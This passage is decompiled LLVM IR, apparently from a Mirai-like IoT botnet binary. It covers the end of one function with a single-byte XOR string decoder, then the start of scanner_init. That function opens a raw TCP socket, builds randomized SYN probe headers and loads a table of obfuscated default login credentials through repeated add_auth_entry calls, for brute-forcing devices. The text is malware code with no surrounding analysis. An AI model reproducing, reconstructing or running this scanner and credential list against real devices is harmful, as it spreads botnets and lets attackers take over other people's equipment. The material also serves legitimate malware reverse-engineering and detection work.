  store i32 %v5_e99c, i32* %v2_e9b0, align 4
  %v1_e9b4 = inttoptr i32 %v0_e9a8 to i8*
  %v2_e9b4 = call i32 @util_strlen(i8* %v1_e9b4)
  %sext = mul i32 %v2_e9b4, 16777216
  %v1_e9b8 = sdiv i32 %sext, 16777216
  %v2_e9b8 = add nsw i32 %v1_e9b8, 1
  store i32 %v2_e9b8, i32* @r4, align 4
  store i32 %v1_e9b8, i32* @r7, align 4
  store i32 %v2_e9b8, i32* @r0, align 4
  %v0_e9c4 = call i32 @malloc()
  store i32 %v0_e9c4, i32* %r0.global-to-local, align 4
  %v0_e9c8 = load i32, i32* @r5, align 4
  store i32 %v0_e9c8, i32* %r1.global-to-local, align 4
  %v0_e9cc = load i32, i32* @r4, align 4
  store i32 %v0_e9cc, i32* %r2.global-to-local, align 4
  store i32 %v0_e9c4, i32* %r6.global-to-local, align 4
  %v3_e9d4 = call i32 @util_memcpy(i32 %v0_e9c4, i32 %v0_e9c8, i32 %v0_e9cc)
  store i32 %v3_e9d4, i32* %r0.global-to-local, align 4
  %v0_e9d8 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e9d8, 1
  %extract.t6 = trunc i32 %v0_e9d8 to i8
  br i1 %tmp22, label %dec_label_pc_e9fc, label %dec_label_pc_e9e0

dec_label_pc_e9e0:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e9e4

dec_label_pc_e9e4:                                ; preds = %dec_label_pc_e9e4, %dec_label_pc_e9e0
  %v2_e9ec = phi i32 [ %v1_e9f0, %dec_label_pc_e9e4 ], [ 0, %dec_label_pc_e9e0 ]
  %v1_e9e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e9e4 = add i32 %v1_e9e4, %v2_e9ec
  %v3_e9e4 = inttoptr i32 %v2_e9e4 to i8*
  %v4_e9e4 = load i8, i8* %v3_e9e4, align 1
  %v6_e9e4 = zext i8 %v4_e9e4 to i32
  %v1_e9e8 = xor i32 %v6_e9e4, 84
  store i32 %v1_e9e8, i32* %r3.global-to-local, align 4
  %v1_e9ec = trunc i32 %v1_e9e8 to i8
  store i8 %v1_e9ec, i8* %v3_e9e4, align 1
  %v0_e9f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e9f0 = add i32 %v0_e9f0, 1
  store i32 %v1_e9f0, i32* %r2.global-to-local, align 4
  %v1_e9f4 = load i32, i32* @r7, align 4
  %v9_e9f4 = icmp eq i32 %v1_e9f0, %v1_e9f4
  br i1 %v9_e9f4, label %dec_label_pc_e9fc.loopexit, label %dec_label_pc_e9e4

dec_label_pc_e9fc.loopexit:                       ; preds = %dec_label_pc_e9e4
  %extract.t = trunc i32 %v1_e9f0 to i8
  br label %dec_label_pc_e9fc

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e9fc.loopexit, %entry
  %v0_ea0c.off0 = phi i8 [ %extract.t, %dec_label_pc_e9fc.loopexit ], [ %extract.t6, %entry ]
  %v2_e9fc = load i32, i32* @global_var_22250.142, align 4
  %v2_ea00 = load i32, i32* @global_var_2227c.144, align 4
  %v3_ea04 = mul i32 %v2_e9fc, 16
  store i32 %v3_ea04, i32* @sb, align 4
  %v2_ea08 = add i32 %v2_ea00, %v3_ea04
  store i32 %v2_ea08, i32* %r2.global-to-local, align 4
  %v3_ea0c = add i32 %v2_ea08, 12
  %v4_ea0c = inttoptr i32 %v3_ea0c to i8*
  store i8 %v0_ea0c.off0, i8* %v4_ea0c, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e9a0, i32* %r3.global-to-local, align 4
  %v0_ea18 = load i32, i32* %r6.global-to-local, align 4
  %v1_ea18 = load i32, i32* @r8, align 4
  %v5_ea18 = mul i32 %v2_e9a0, 16
  %v6_ea18 = add i32 %v1_ea18, %v5_ea18
  %v7_ea18 = inttoptr i32 %v6_ea18 to i32*
  store i32 %v0_ea18, i32* %v7_ea18, align 4
  %v2_ea1c = load i32, i32* @global_var_2227c.144, align 4
  store i32 %v2_ea1c, i32* @r7, align 4
  %v1_ea20 = inttoptr i32 %arg2 to i8*
  %v2_ea20 = call i32 @util_strlen(i8* %v1_ea20)
  %sext1 = mul i32 %v2_ea20, 16777216
  %v1_ea24 = sdiv i32 %sext1, 16777216
  %v2_ea24 = add nsw i32 %v1_ea24, 1
  store i32 %v2_ea24, i32* @r4, align 4
  store i32 %v1_ea24, i32* @r6, align 4
  store i32 %v2_ea24, i32* @r0, align 4
  %v0_ea30 = call i32 @malloc()
  store i32 %v0_ea30, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ea38 = load i32, i32* @r4, align 4
  store i32 %v0_ea38, i32* %r2.global-to-local, align 4
  store i32 %v0_ea30, i32* %r5.global-to-local, align 4
  %v3_ea40 = call i32 @util_memcpy(i32 %v0_ea30, i32 %arg2, i32 %v0_ea38)
  store i32 %v3_ea40, i32* %r0.global-to-local, align 4
  %v0_ea44 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ea44, 1
  %extract.t8 = trunc i32 %v0_ea44 to i8
  br i1 %tmp23, label %dec_label_pc_ea68, label %dec_label_pc_ea4c

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_e9fc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %dec_label_pc_ea50, %dec_label_pc_ea4c
  %v2_ea58 = phi i32 [ %v1_ea5c, %dec_label_pc_ea50 ], [ 0, %dec_label_pc_ea4c ]
  %v1_ea50 = load i32, i32* %r5.global-to-local, align 4
  %v2_ea50 = add i32 %v1_ea50, %v2_ea58
  %v3_ea50 = inttoptr i32 %v2_ea50 to i8*
  %v4_ea50 = load i8, i8* %v3_ea50, align 1
  %v6_ea50 = zext i8 %v4_ea50 to i32
  %v1_ea54 = xor i32 %v6_ea50, 84
  store i32 %v1_ea54, i32* %r3.global-to-local, align 4
  %v1_ea58 = trunc i32 %v1_ea54 to i8
  store i8 %v1_ea58, i8* %v3_ea50, align 1
  %v0_ea5c = load i32, i32* %r2.global-to-local, align 4
  %v1_ea5c = add i32 %v0_ea5c, 1
  store i32 %v1_ea5c, i32* %r2.global-to-local, align 4
  %v1_ea60 = load i32, i32* @r6, align 4
  %v9_ea60 = icmp eq i32 %v1_ea5c, %v1_ea60
  br i1 %v9_ea60, label %dec_label_pc_ea68.loopexit, label %dec_label_pc_ea50

dec_label_pc_ea68.loopexit:                       ; preds = %dec_label_pc_ea50
  %extract.t7 = trunc i32 %v1_ea5c to i8
  br label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea68.loopexit, %dec_label_pc_e9fc
  %v0_ea78.off0 = phi i8 [ %extract.t7, %dec_label_pc_ea68.loopexit ], [ %extract.t8, %dec_label_pc_e9fc ]
  %v2_ea68 = load i32, i32* @global_var_22250.142, align 4
  store i32 %v2_ea68, i32* %r0.global-to-local, align 4
  %v2_ea6c = load i32, i32* @global_var_2227c.144, align 4
  %v3_ea70 = mul i32 %v2_ea68, 16
  store i32 %v3_ea70, i32* %r1.global-to-local, align 4
  %v2_ea74 = or i32 %v3_ea70, 13
  %v3_ea78 = add i32 %v2_ea74, %v2_ea6c
  %v4_ea78 = inttoptr i32 %v3_ea78 to i8*
  store i8 %v0_ea78.off0, i8* %v4_ea78, align 1
  store i32 ptrtoint (i16** @global_var_22280.146 to i32), i32* %r4.global-to-local, align 4
  %v2_ea84 = load i16, i16* bitcast (i16** @global_var_22280.146 to i16*), align 4
  %v3_ea84 = zext i16 %v2_ea84 to i32
  store i32 %v3_ea84, i32* %lr.global-to-local, align 4
  %v2_ea8c = load i32, i32* @global_var_2227c.144, align 4
  store i32 %v2_ea8c, i32* %r2.global-to-local, align 4
  %v0_ea94 = load i32, i32* %r1.global-to-local, align 4
  %v2_ea94 = add i32 %v0_ea94, %v2_ea8c
  store i32 %v2_ea94, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22280.146 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_ea9c = load i32, i32* @sb, align 4
  %v1_ea9c = load i32, i32* @r7, align 4
  %v2_ea9c = add i32 %v1_ea9c, %v0_ea9c
  store i32 %v2_ea9c, i32* %ip.global-to-local, align 4
  %v0_eaa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_eaa0 = add i32 %v0_eaa0, 1
  store i32 %v1_eaa0, i32* %r0.global-to-local, align 4
  %v3_eaa4 = add i32 %v2_ea94, 10
  %v4_eaa4 = inttoptr i32 %v3_eaa4 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22280.146 to i32), i32 16), i32 16) to i16), i16* %v4_eaa4, align 2
  %v0_eaa8 = load i32, i32* %lr.global-to-local, align 4
  %v1_eaa8 = trunc i32 %v0_eaa8 to i16
  %v2_eaa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_eaa8 = add i32 %v2_eaa8, 8
  %v4_eaa8 = inttoptr i32 %v3_eaa8 to i16*
  store i16 %v1_eaa8, i16* %v4_eaa8, align 2
  %v0_eaac = load i32, i32* %r5.global-to-local, align 4
  %v1_eaac = load i32, i32* %ip.global-to-local, align 4
  %v2_eaac = add i32 %v1_eaac, 4
  %v3_eaac = inttoptr i32 %v2_eaac to i32*
  store i32 %v0_eaac, i32* %v3_eaac, align 4
  %v1_eab0 = load i32, i32* @fp, align 4
  %v2_eab0 = inttoptr i32 %v1_eab0 to i32*
  store i32 %v1_eaa0, i32* %v2_eab0, align 4
  %v0_eab4 = load i32, i32* %r3.global-to-local, align 4
  %v1_eab4 = trunc i32 %v0_eab4 to i16
  %v2_eab4 = load i32, i32* %r4.global-to-local, align 4
  %v3_eab4 = inttoptr i32 %v2_eab4 to i16*
  store i16 %v1_eab4, i16* %v3_eab4, align 2
  store i32 %v3_e970, i32* @r4, align 4
  store i32 %v6_e970, i32* @r5, align 4
  store i32 %v9_e970, i32* @r6, align 4
  store i32 %v12_e970, i32* @r7, align 4
  store i32 %v15_e970, i32* @r8, align 4
  store i32 %v18_e970, i32* @sb, align 4
  store i32 %v21_e970, i32* @sl, align 4
  store i32 %v24_e970, i32* @fp, align 4
  ret i32 %v1_eaa0

; uselistorder directives
  uselistorder i32 %v3_ea70, { 1, 0 }
  uselistorder i32 %v1_ea5c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ea30, { 1, 0, 2 }
  uselistorder i32 %v3_ea04, { 1, 0 }
  uselistorder i32 %v1_e9f0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e9c4, { 1, 0, 2 }
  uselistorder i32 %v2_e9a0, { 1, 0, 2 }
  uselistorder i32 %v3_e994, { 1, 0 }
  uselistorder i32 %v1_e984, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 5, 6, 0, 1, 2, 3, 4, 28, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp335 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ead0 = load i32, i32* @r5, align 4
  %v18_ead0 = load i32, i32* @sb, align 4
  %v0_eadc = call i32 @__libc_fork()
  store i32 %v0_eadc, i32* %r0.global-to-local, align 4
  %v7_eae0 = icmp eq i32 %v0_eadc, -1
  %. = zext i1 %v7_eae0 to i32
  %tmp370 = icmp slt i32 %v0_eadc, 1
  %storemerge329 = select i1 %tmp370, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24d70.148 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eafc = icmp eq i32 %storemerge329, 0
  store i1 %v2_eafc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_eadc, i32* @global_var_24d70.148, align 4
  br i1 %v2_eafc, label %dec_label_pc_eb18, label %dec_label_pc_eb08

dec_label_pc_eb08:                                ; preds = %entry
  store i32 %v6_ead0, i32* @r5, align 4
  store i32 %v18_ead0, i32* @sb, align 4
  ret i32 %v0_eadc

dec_label_pc_eb18:                                ; preds = %entry
  %v0_eb18 = call i32 @util_local_addr()
  store i32 %v0_eb18, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_eb18, i32* @global_var_24d4c.56, align 4
  %v1_eb24 = call i32 @rand_init(i32 %v0_eb18)
  %v0_eb28 = load i32, i32* @r4, align 4
  store i32 %v0_eb28, i32* %r0.global-to-local, align 4
  %v1_eb2c = inttoptr i32 %v0_eb28 to i32*
  %v2_eb2c = call i32 @__GI_time(i32* %v1_eb2c)
  store i32 ptrtoint (i32* @global_var_22284.140 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_eb2c, i32* @global_var_22284.140, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_eb40 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_24d68.152 to i32), i32* %r3.global-to-local, align 4
  %v0_eb48 = load i32, i32* @r4, align 4
  store i32 %v0_eb48, i32* %stack_var_-52, align 4
  store i32 %v2_eb40, i32* @global_var_24d68.152, align 4
  store i32 %v0_eb48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb54

dec_label_pc_eb54:                                ; preds = %dec_label_pc_eb54.dec_label_pc_eb54_crit_edge, %dec_label_pc_eb18
  %v2_eb60 = phi i32 [ %v2_eb60.pre, %dec_label_pc_eb54.dec_label_pc_eb54_crit_edge ], [ %v2_eb40, %dec_label_pc_eb18 ]
  %v0_eb68 = phi i32 [ %v0_eb98, %dec_label_pc_eb54.dec_label_pc_eb54_crit_edge ], [ %v0_eb48, %dec_label_pc_eb18 ]
  %v3_eb5c = mul i32 %v0_eb68, 256
  store i32 %v3_eb5c, i32* %ip.global-to-local, align 4
  store i32 %v2_eb60, i32* @lr, align 4
  %v2_eb70 = mul i32 %v0_eb68, 288
  %v1_eb78 = add i32 %v0_eb68, 1
  store i32 %v1_eb78, i32* %r0.global-to-local, align 4
  %v2_eb7c = add i32 %v2_eb70, %v2_eb60
  store i32 %v2_eb7c, i32* %r2.global-to-local, align 4
  store i32 %v2_eb7c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_eb90 = add i32 %v2_eb7c, 4
  %v3_eb90 = inttoptr i32 %v2_eb90 to i32*
  store i32 -1, i32* %v3_eb90, align 4
  %v0_eb94 = load i32, i32* @r5, align 4
  %v1_eb94 = load i32, i32* %r1.global-to-local, align 4
  %v2_eb94 = add i32 %v1_eb94, 12
  %v3_eb94 = inttoptr i32 %v2_eb94 to i32*
  store i32 %v0_eb94, i32* %v3_eb94, align 4
  %v0_eb98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_eb98, i32* %stack_var_-52, align 4
  %v7_eb9c = icmp sgt i32 %v1_eb78, 255
  br i1 %v7_eb9c, label %dec_label_pc_eba0, label %dec_label_pc_eb54.dec_label_pc_eb54_crit_edge

dec_label_pc_eb54.dec_label_pc_eb54_crit_edge:    ; preds = %dec_label_pc_eb54
  %v2_eb60.pre = load i32, i32* @global_var_24d68.152, align 4
  br label %dec_label_pc_eb54

dec_label_pc_eba0:                                ; preds = %dec_label_pc_eb54
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_ebac = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ebac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24d6c.154 to i32), i32* %r2.global-to-local, align 4
  %v2_ebb4 = icmp eq i32 %v3_ebac, -1
  store i1 %v2_ebb4, i1* %cpsr_c.global-to-local, align 1
  %v7_ebb4 = icmp eq i32 %v3_ebac, -1
  store i1 %v7_ebb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ebac, i32* @r4, align 4
  store i32 %v3_ebac, i32* @global_var_24d6c.154, align 4
  br i1 %v7_ebb4, label %dec_label_pc_10280, label %dec_label_pc_ebc4

dec_label_pc_ebc4:                                ; preds = %dec_label_pc_eba0
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_ebc8 = load i32, i32* @r5, align 4
  store i32 %v0_ebc8, i32* @r2, align 4
  %v2_ebcc = call i32 @__libc_fcntl(i32 %v3_ebac, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ebd4 = or i32 %v2_ebcc, 2048
  store i32 %v1_ebd4, i32* @r2, align 4
  %v0_ebd8 = load i32, i32* @r4, align 4
  store i32 %v0_ebd8, i32* %r0.global-to-local, align 4
  %v2_ebdc = call i32 @__libc_fcntl(i32 %v0_ebd8, i32 4)
  %v2_ebe4 = load i32, i32* @global_var_24d6c.154, align 4
  store i32 %v2_ebe4, i32* %r0.global-to-local, align 4
  %v2_ebe8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_ebf0 = load i32, i32* @r5, align 4
  store i32 %v0_ebf0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ebf8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ebf8, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ec08 = call i32 @__GI_setsockopt(i32 %v2_ebe4, i32 %v0_ebf0, i32 3, i32 %v2_ebf8, i32 4)
  store i32 %v5_ec08, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec0c = icmp eq i32 %v5_ec08, 0
  store i1 %v2_ec0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec0c, label %dec_label_pc_ec14, label %dec_label_pc_10274

dec_label_pc_ec14:                                ; preds = %dec_label_pc_ebc4, %dec_label_pc_ec14
  %v0_ec14 = call i32 @rand_next()
  %v3_ec18 = mul i32 %v0_ec14, 65536
  store i32 %v3_ec18, i32* %r0.global-to-local, align 4
  %v1_ec20 = mul i32 %v0_ec14, 256
  %v3_ec24 = and i32 %v1_ec20, 65280
  %tmp373 = udiv i32 %v0_ec14, 256
  %v4_ec28 = urem i32 %tmp373, 256
  %v5_ec28 = or i32 %v4_ec28, %v3_ec24
  store i32 %v5_ec28, i32* %r3.global-to-local, align 4
  %v2_ec2c = icmp ugt i32 %v5_ec28, 1023
  store i1 %v2_ec2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec2c = icmp eq i32 %v5_ec28, 1024
  store i1 %v7_ec2c, i1* %cpsr_z.global-to-local, align 1
  %v3_ec34 = icmp ult i32 %v5_ec28, 1022
  br i1 %v3_ec34, label %dec_label_pc_ec14, label %dec_label_pc_ec38

dec_label_pc_ec38:                                ; preds = %dec_label_pc_ec14
  %v5_ec30.le = trunc i32 %v0_ec14 to i16
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %r0.global-to-local, align 4
  %v2_ec3c = load i8, i8* bitcast (i8** @global_var_22254.156 to i8*), align 4
  %v3_ec3c = zext i8 %v2_ec3c to i32
  %v1_ec40 = and i32 %v3_ec3c, 240
  %v1_ec44 = or i32 %v1_ec40, 5
  store i32 %v1_ec44, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_22254.156 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_22256.157 to i16*), align 4
  %v0_ec64 = call i32 @rand_next()
  %v1_ec64 = trunc i32 %v0_ec64 to i16
  %v3_ec6c = load i8, i8* @global_var_22274.160, align 1
  store i32 ptrtoint (i16* @global_var_22268.159 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_22254.156 to i32), i32* %ip.global-to-local, align 4
  %v1_ec7c = urem i8 %v3_ec6c, 16
  store i16 %v1_ec64, i16* bitcast (i32* @global_var_22258.161 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_ec8c = or i8 %v1_ec7c, 80
  store i8 64, i8* bitcast (i32* @global_var_2225c.162 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_2225d.163 to i8*), align 4
  store i8 %v1_ec8c, i8* @global_var_22274.160, align 1
  %v4_ec9c = sext i16 %v5_ec30.le to i32
  store i32 %v4_ec9c, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_2226a.164, align 2
  store i16 %v5_ec30.le, i16* @global_var_22268.159, align 2
  %v0_ecac = call i32 @rand_next()
  %v1_ecac = trunc i32 %v0_ecac to i16
  %v3_ecb4 = load i8, i8* @global_var_22275.165, align 1
  %v4_ecb4 = zext i8 %v3_ecb4 to i32
  store i32 ptrtoint (i16* @global_var_22268.159 to i32), i32* %ip.global-to-local, align 4
  %v1_ecbc = or i32 %v4_ecb4, 2
  store i32 %v1_ecbc, i32* %r3.global-to-local, align 4
  store i16 %v1_ecac, i16* bitcast (i32* @global_var_22276.166 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_19724.168 to i32), i32* %r1.global-to-local, align 4
  %v1_ecc8 = trunc i32 %v1_ecbc to i8
  store i8 %v1_ecc8, i8* @global_var_22275.165, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_ecd4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint (i32* @global_var_19724.168 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19728.172 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_ece4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint ([5 x i8]* @global_var_19728.172 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19730.174 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ecf4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint ([9 x i8]* @global_var_19730.174 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_1973c.176 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1973c.176 to i32), i32* %r1.global-to-local, align 4
  %v5_ed04 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_1973c.176 to i32), i32 ptrtoint ([7 x i8]* @global_var_1973c.176 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19724.168 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ed14 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32 ptrtoint (i32* @global_var_19724.168 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1974c.180 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_ed24 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint ([9 x i8]* @global_var_1974c.180 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_19758.182 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19758.182 to i32), i32* %r1.global-to-local, align 4
  %v5_ed34 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19758.182 to i32), i32 ptrtoint ([6 x i8]* @global_var_19758.182 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19760.184 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ed44 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint ([6 x i8]* @global_var_19760.184 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_19768.186 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19768.186 to i32), i32* %r1.global-to-local, align 4
  %v5_ed54 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19768.186 to i32), i32 ptrtoint ([8 x i8]* @global_var_19768.186 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_ed64 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19770.188 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_ed74 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint (i32* @global_var_19770.188 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19780.190 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ed84 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), i32 ptrtoint ([6 x i8]* @global_var_19780.190 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), i32* %r1.global-to-local, align 4
  %v5_ed94 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19780.190 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_eda4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), i32 ptrtoint ([6 x i8]* @global_var_19780.190 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19790.194 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_edb4 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32 ptrtoint (i32* @global_var_19790.194 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1979c.196 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_edc4 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), i32 ptrtoint (i32* @global_var_1979c.196 to i32), i32 15)
